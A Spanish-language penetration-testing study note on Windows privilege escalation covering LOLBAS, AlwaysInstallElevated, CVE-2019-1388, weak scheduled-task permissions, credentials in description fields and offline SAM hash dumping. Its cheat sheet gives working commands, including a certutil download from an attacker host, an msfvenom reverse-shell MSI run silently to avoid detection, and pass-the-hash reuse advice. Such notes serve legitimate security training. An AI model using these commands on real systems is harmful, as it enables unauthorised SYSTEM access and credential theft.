---
tags:
  - windows
  - privex
---
## Conceptos Clave (TL;DR)

- **LOLBAS**: binarios/scripts firmados por Microsoft (certutil, rundll32, etc.) con funcionalidad "inesperada" (transferencia de archivos, ejecución de código, persistencia) útiles cuando el cliente restringe herramientas externas o se requiere evasión.
- **AlwaysInstallElevated**: mala configuración de GPO que permite a cualquier usuario instalar paquetes `.msi` con privilegios de `SYSTEM`, sin importar permisos del usuario.
- **CVE-2019-1388**: bypass de UAC en el diálogo de certificados de Windows; un binario firmado con el campo `SpcSpAgencyInfo` (OID `1.3.6.1.4.1.311.2.1.10`) abre un navegador como `SYSTEM`, desde el cual se puede "escapar" a una shell `SYSTEM`.
- **Tareas programadas con permisos débiles**: si un script ejecutado por una tarea programada (corriendo como `SYSTEM`/admin) tiene permisos de escritura para usuarios estándar, se puede inyectar código que se ejecutará con privilegios elevados.
- **Campo de descripción de usuario/equipo**: los sysadmins a veces dejan credenciales en texto claro en el campo "Description" de cuentas locales o del equipo.
- **VHDX/VMDK + SAM/SECURITY/SYSTEM hives**: backups de máquinas virtuales montados permiten extraer los hives del registro y volcar hashes NTLM locales con `secretsdump.py`, incluso sin escalar privilegios en el host en vivo.

## Herramientas Clave

| Herramienta | Propósito |
|---|---|
| `certutil.exe` | LOLBIN nativo de Windows: descarga archivos (`-urlcache`), codifica/decodifica en base64 (`-encode`/`-decode`). |
| `rundll32.exe` | LOLBIN: ejecuta funciones exportadas de un DLL (útil para reverse shell vía DLL). |
| `msfvenom` | Generar payload malicioso en formato `.msi` para abusar de AlwaysInstallElevated. |
| `msiexec.exe` | Ejecutar el paquete `.msi` malicioso de forma silenciosa en el objetivo. |
| `nc` (netcat) | Listener para capturar la shell inversa. |
| `reg query` | Enumerar claves de registro de GPO (AlwaysInstallElevated). |
| `hhupd.exe` | Binario legítimo firmado por Microsoft (antiguo) vulnerable a CVE-2019-1388. |
| `schtasks` | Enumeración de tareas programadas vía CMD. |
| `Get-ScheduledTask` | Enumeración de tareas programadas vía PowerShell. |
| `accesschk64.exe` (Sysinternals) | Verificar permisos efectivos sobre archivos/carpetas (ACLs). |
| `Get-LocalUser` | Enumerar usuarios locales y su campo Description. |
| `Get-WmiObject -Class Win32_OperatingSystem` | Enumerar el campo Description del equipo. |
| `Snaffler` | Enumeración masiva de archivos sensibles en shares de red (contraseñas, KeePass, SSH keys, .vhd/.vhdx/.vmdk). |
| `guestmount` (libguestfs) | Montar imágenes `.vmdk`/`.vhdx` en Linux en modo solo lectura. |
| `Mount-VHD` (PowerShell) / Administración de discos | Montar `.vhd`/`.vhdx` en Windows. |
| `secretsdump.py` (Impacket) | Extraer hashes NTLM locales desde hives SAM/SECURITY/SYSTEM offline. |

## Metodología Paso a Paso

### 1. LOLBAS - Transferencia/Codificación de archivos con Certutil
1. Identificar que el binario está presente y firmado (nativo en todo Windows).
2. Usar `certutil` para traer una herramienta/payload desde tu servidor de attacker sin tocar disco con utilidades externas.
3. Alternativamente, codificar en base64 un archivo en el host de ataque, copiar el texto/archivo al objetivo y decodificarlo allí (útil cuando solo tienes una shell limitada tipo copy-paste).

### 2. AlwaysInstallElevated
1. **Enumerar** la clave de registro en `HKCU` y `HKLM` para confirmar que `AlwaysInstallElevated = 0x1` en ambas rutas (debe estar habilitado en las dos para ser explotable).
2. **Generar** un payload `.msi` malicioso con `msfvenom`.
3. **Transferir** el `.msi` al objetivo.
4. **Levantar listener** (netcat) en el host de ataque.
5. **Ejecutar** el `.msi` con `msiexec` usando flags silenciosos (`/quiet /qn /norestart`) para evitar alertar al usuario.
6. **Confirmar** la shell entrante como `NT AUTHORITY\SYSTEM`.

### 3. CVE-2019-1388 (UAC Certificate Dialog Bypass)
1. Verificar la versión de Windows contra la lista de versiones vulnerables (parcheado nov. 2019).
2. Ejecutar un binario antiguo firmado por Microsoft con el campo `SpcSpAgencyInfo` poblado (ej. `hhupd.exe`) como Administrador → aparece el prompt de UAC.
3. En el prompt de UAC, click en "Mostrar información sobre el certificado del editor".
4. En la pestaña Detalles confirmar que `SpcSpAgencyInfo` está poblado; volver a la pestaña General.
5. Click en el hipervínculo del campo "Emitido por" → se abre un navegador corriendo como `SYSTEM` (verificar en Task Manager).
6. En el navegador: click derecho → "Ver código fuente de la página".
7. En la pestaña de código fuente: click derecho → "Guardar como".
8. En el diálogo "Guardar como", escribir en la barra de ruta `C:\Windows\System32\cmd.exe` (o `powershell.exe`) y presionar Enter.
9. Obtener consola interactiva como `SYSTEM`.

### 4. Tareas Programadas - Enumeración y abuso de permisos débiles
1. Enumerar tareas programadas accesibles para tu usuario (CMD o PowerShell). Por defecto, solo verás tus propias tareas y las predeterminadas del sistema (no las de Administradores, almacenadas en `C:\Windows\System32\Tasks`, sin acceso de lectura para usuarios estándar).
2. Buscar directorios usados por scripts ejecutados por tareas programadas (ej. `C:\Scripts`) y comprobar permisos efectivos con `accesschk64.exe`.
3. Si `BUILTIN\Users` tiene `RW` sobre la carpeta o sobre scripts individuales dentro de ella, identificar qué script probablemente se ejecuta automáticamente (ej. backups diarios).
4. Inyectar código (ej. un beacon C2, comando de reverse shell, o creación de usuario admin) al final del script con permisos débiles.
5. Esperar a que la tarea programada se dispare (puede tardar horas) y verificar la sesión entrante — usualmente como `SYSTEM` o cuenta de servicio con privilegios.

### 5. Campo de Descripción de Usuario/Equipo
1. Enumerar usuarios locales y revisar la columna `Description` en busca de credenciales o pistas dejadas por sysadmins.
2. Enumerar el campo Description del propio sistema operativo (a veces contiene notas administrativas).
3. (Más común en AD) Repetir la misma lógica contra el campo Description de cuentas de dominio.

### 6. Montaje de VHDX/VMDK + Extracción de Hashes
1. Durante enumeración de shares de red, identificar archivos `.vhd`, `.vhdx` o `.vmdk` (backups de Hyper-V/VMware), idealmente con nombres que coincidan con hostnames de interés (ej. un DC o un host donde no pudiste escalar).
2. Usar `Snaffler` para automatizar la búsqueda de estos archivos junto con otros secretos (passwords, KeePass, SSH keys, web.config).
3. Montar la imagen en Linux (`guestmount`) o en Windows (clic derecho → Montar / `Mount-VHD` / Administración de discos / mapeo de disco virtual para `.vmdk`).
4. Navegar hasta `C:\Windows\System32\Config` dentro de la imagen montada y copiar los hives `SAM`, `SECURITY` y `SYSTEM`.
5. Ejecutar `secretsdump.py` en modo `LOCAL` contra los tres hives extraídos para volcar los hashes NTLM de usuarios locales.
6. Probar el hash de Administrador local recuperado contra otros hosts del entorno (reutilización de contraseñas locales/pass-the-hash).

## Cheat Sheet de Comandos

```powershell
# --- LOLBAS / Certutil ---

# Descargar un archivo desde un servidor HTTP del atacante y guardarlo en disco
# -urlcache: usa la caché de URL: -split: separa encabezado/contenido; -f: fuerza sobrescritura
certutil.exe -urlcache -split -f http://<ATTACKER_IP>:<PORT>/<FILE> <OUTPUT_FILE>
```

```cmd
:: Codificar un archivo local en base64 (para exfiltrar/transferir como texto)
C:\htb> certutil -encode <INPUT_FILE> <ENCODED_OUTPUT_FILE>

:: Decodificar un archivo previamente codificado en base64 a su contenido original
C:\htb> certutil -decode <ENCODED_FILE> <OUTPUT_FILE>
```

```powershell
# --- AlwaysInstallElevated: Enumeración ---

# Comprobar si la directiva está habilitada a nivel de usuario actual
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

# Comprobar si la directiva está habilitada a nivel de máquina
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
# Si ambas claves "AlwaysInstallElevated" devuelven REG_DWORD 0x1 -> explotable
```

```bash
# --- AlwaysInstallElevated: Generación del payload MSI (en máquina de ataque) ---

# -p: payload reverse shell para Windows; lhost/lport: callback al atacante; -f msi: formato de salida
msfvenom -p windows/shell_reverse_tcp lhost=<ATTACKER_IP> lport=<LPORT> -f msi > aie.msi
```

```cmd
:: --- AlwaysInstallElevated: Ejecución del MSI malicioso (en el objetivo) ---

:: /i: instalar; /quiet /qn: sin interfaz/silencioso; /norestart: evitar reinicio que delate la actividad
C:\htb> msiexec /i C:\Users\<USER>\Desktop\aie.msi /quiet /qn /norestart
```

```bash
# --- AlwaysInstallElevated: Listener en la máquina de ataque (ejecutar ANTES del msiexec) ---

# -l: listen; -n: numérico (sin resolución DNS); -v: verbose; -p: puerto
nc -lnvp <LPORT>
```

```cmd
:: --- Tareas Programadas: Enumeración ---

:: /fo LIST: formato lista; /v: verbose (muestra Run As User, Last Run Time, etc.)
C:\htb> schtasks /query /fo LIST /v
```

```powershell
# Enumerar tareas programadas y su estado vía PowerShell
Get-ScheduledTask | select TaskName,State
```

```cmd
:: --- Tareas Programadas: Verificación de permisos sobre directorio/scripts ---

:: /accepteula: acepta el EULA sin prompt; -s: recursivo en subdirectorios; -d: solo directorios
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\
```

```powershell
# --- Campo de Descripción ---

# Listar usuarios locales junto con su campo Description (posibles credenciales filtradas)
Get-LocalUser

# Obtener el campo Description configurado a nivel de sistema operativo
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

```bash
# --- Montaje de VHDX/VMDK en Linux ---

# -a: archivo de disco; -i: inspeccionar e identificar particiones automáticamente; --ro: solo lectura
guestmount -a <FILE>.vmdk -i --ro /mnt/vmdk

# --add: archivo de disco; --ro: solo lectura; -m: partición específica a montar (ej. /dev/sda1)
guestmount --add <FILE>.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

```bash
# --- Extracción de hashes locales desde hives offline ---

# -sam/-security/-system: rutas a los hives copiados; LOCAL: indica que se procesan offline (no contra un host en vivo)
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

## Gotchas y Troubleshooting

- **Certutil / LOLBAS**: revisar el proyecto LOLBAS completo (no solo certutil) — útil específicamente en evaluaciones evasivas o restringidas a estación/servidor Windows gestionado, donde no se permite subir herramientas externas.
- **AlwaysInstallElevated**: la clave debe existir y estar en `0x1` en **ambas** rutas de registro (`HKCU` y `HKLM`); si falta una, la técnica no funciona igual. Mitigación = deshabilitar ambas configuraciones de GPO.
- **MSI payload**: `msfvenom` selecciona por defecto plataforma Windows / arquitectura x86 si no se especifica explícitamente — verificar que el tamaño final del archivo generado sea razonable (no vacío/corrupto) antes de transferirlo.
- **CVE-2019-1388**: requiere acceso a **GUI** del sistema objetivo (no funciona vía shell remota sin interfaz gráfica); requiere un binario antiguo firmado con el OID `SPC_SP_AGENCY_INFO_OBJID` (`1.3.6.1.4.1.311.2.1.10`) poblado en el campo `SpcSpAgencyInfo`, como `hhupd.exe`; parcheado por Microsoft en noviembre de 2019, por lo que solo aplica a sistemas sin ese parche. Los pasos pueden variar ligeramente según el navegador (documentado con Chrome).
- **Tareas programadas**: como usuario estándar **no** se pueden listar tareas creadas por administradores (residen en `C:\Windows\System32\Tasks`, sin permiso de lectura para usuarios normales) — esto limita lo que `schtasks`/`Get-ScheduledTask` mostrarán.
- **Permisos débiles en directorios de scripts**: la explotación depende de que la tarea se ejecute automáticamente (puede tardar horas, incluso hasta el día siguiente) — paciencia y un beacon/callback persistente son clave; es una técnica que normalmente aparece tras agotar otras rutas de escalada.
- **Campo Description**: técnica de "bajo costo, alto valor" — siempre vale la pena revisarla tanto en local como en AD, aunque es más común encontrarla poblada en entornos de Active Directory.
- **Snaffler / VHDX-VMDK**: buscar específicamente archivos `.vhd`, `.vhdx`, `.vmdk` en shares de backup, especialmente si el nombre del archivo coincide con un hostname donde no se pudo escalar previamente — puede ser la única vía para llegar a credenciales de Domain Admin si esa máquina tiene sesiones activas.
- **Montaje en Windows**: si el montaje directo de `.vmdk` (clic derecho → "Mapear disco virtual") falla, alternativas son VMware Workstation ("Mapear discos virtuales"), añadir el `.vmdk` como disco duro virtual adicional a una VM de ataque, o extraer contenido directamente con 7-Zip.
- **Secretsdump**: solo es útil si se logran extraer los tres hives `SAM`, `SECURITY` y `SYSTEM` desde `C:\Windows\System32\Config` dentro de la imagen montada; el modo `LOCAL` es exclusivamente para procesamiento offline de hives ya copiados (no se conecta a un host remoto). El hash de Administrador local recuperado puede ser reutilizado en otros hosts del entorno (probar pass-the-hash / reutilización de credenciales locales).